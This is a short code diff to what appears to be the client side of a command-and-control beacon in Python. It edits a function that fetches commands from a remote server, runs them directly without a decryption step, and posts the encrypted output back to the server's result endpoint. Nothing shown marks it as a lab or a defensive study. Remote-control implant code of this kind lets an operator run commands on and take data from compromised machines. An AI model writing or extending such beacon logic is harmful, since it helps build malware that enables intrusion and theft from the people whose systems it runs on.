@@ -37,12 +37,15 @@ def heartbeat():
 
 def beacon_command(commands):
     for cmd in commands:
-        plain_cmd = decrypt(cmd["command"])  # decrypt before exec
-        output = execute_command(plain_cmd)
+        # 🔹 command already plaintext from server
+        output = execute_command(cmd["command"])
+
+        # Encrypt only in transit
         requests.post(f"{SERVER_URL}/result", json={
             "command_id": cmd["command_id"],
-            "result": encrypt(output)  # encrypt before sending
+            "result": encrypt(output)   # traffic only
         })
+
 
 
 def execute_command(command):
